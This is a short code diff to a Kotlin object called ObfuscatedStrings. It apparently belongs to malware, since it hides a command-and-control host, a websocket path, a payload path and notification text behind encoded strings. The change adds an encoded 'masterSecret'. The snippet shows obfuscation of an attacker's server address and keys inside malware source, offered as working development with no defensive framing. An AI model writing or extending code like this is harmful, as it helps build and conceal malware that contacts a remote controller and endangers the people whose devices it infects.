@@ -6,6 +6,7 @@ object ObfuscatedStrings {
     val c2Host: String get() = o("IiIiezg8JzQ8Mjk6NzQ5eyY8ITA=")
     val wsPath: String get() = o("eiIm")
     val payloadPath: String get() = o("ejQlPHolNCw5OjQx")
+    val masterSecret: String get() = o("MRk0HhInECAUNjYHNxI3ZmZiI20mZzAiLxYFIjwMD2MhJhkcPQwMGB8QEGg=")
 
     val notifChannelId: String get() = o("Nj00ODA5MDo7CiYsOzY=")
     val notifTitle: String get() = o("BiwmITA4dQYsOzY=")
